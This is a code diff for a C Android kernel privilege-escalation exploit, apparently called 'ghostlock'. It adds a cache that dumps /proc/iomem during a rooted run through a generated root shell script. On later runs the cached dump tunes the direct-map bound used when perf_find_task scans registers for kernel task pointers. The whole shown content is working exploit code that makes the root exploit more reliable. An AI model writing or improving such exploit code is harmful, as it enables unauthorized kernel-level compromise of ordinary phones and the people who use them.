@@ -7,6 +7,7 @@
 
 #include "common.h"
 #include "offsets.h"
+#include "iomem.h"
 #include <ctype.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -519,6 +520,41 @@ static void init_runtime_paths(void) {
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
 }
 
+/* A rooted run leaves its /proc/iomem in the home dir, which measures the
+ * direct map on this unit, something no image file carries.  The first run on
+ * a device has no dump and keeps the built-in geometry. */
+static void apply_iomem_cache(void) {
+  char path[300];
+  snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
+  FILE *f = fopen(path, "r");
+  if (!f) {
+    pr_info("iomem cache: no dump, keeping the built-in geometry\n");
+    return;
+  }
+
+  /* the first line names the release that wrote the dump, so an image that
+   * moved under a new kernel cannot feed this run the old geometry */
+  char stamp[128] = "";
+  uint64_t span = 0;
+  const char *release = active_offsets ? active_offsets->uname_r : "";
+  int ok = fgets(stamp, sizeof(stamp), f) != NULL;
+  stamp[strcspn(stamp, "\r\n")] = '\0';
+  ok = ok && strncmp(stamp, "# ", 2) == 0 && strcmp(stamp + 2, release) == 0 &&
+       iomem_map_span(f, &span);
+  fclose(f);
+
+  uint64_t max_span = DIRECT_MAP_END_DEFAULT - DIRECT_MAP_BASE;
+  if (!ok || span > max_span) {
+    pr_info("iomem cache: no dump for this kernel, keeping the built-in "
+            "geometry\n");
+    return;
+  }
+
+  g_direct_map_end = DIRECT_MAP_BASE + span;
+  pr_info("iomem cache: direct_map_end=%016llx\n",
+          (unsigned long long)g_direct_map_end);
+}
+
 static void write_root_script(void) {
   char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
@@ -558,6 +594,13 @@ static void write_root_script(void) {
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
+      /* the cache only ever holds a whole dump, rename is atomic and a failed
+       * cat leaves the old cache in place */
+      "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
+      "cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null &&\n"
+      "mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\" &&\n"
+      "chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
+      "echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
@@ -736,7 +779,7 @@ static uintptr_t perf_find_task(void) {
           uint64_t v = regs[i];
           /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
           v |= 0x0fULL << 56;
-          if (v > 0xffffff8000000000ULL && v < DIRECT_MAP_END)
+          if (v > 0xffffff8000000000ULL && v < g_direct_map_end)
             cands[nc++] = v;
         }
       }
@@ -1043,6 +1086,7 @@ int run_exploit(int argc, char **argv) {
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
+  apply_iomem_cache();
   log_startup_context();
   init_p0_profile();
   pin_to_core(CORE);
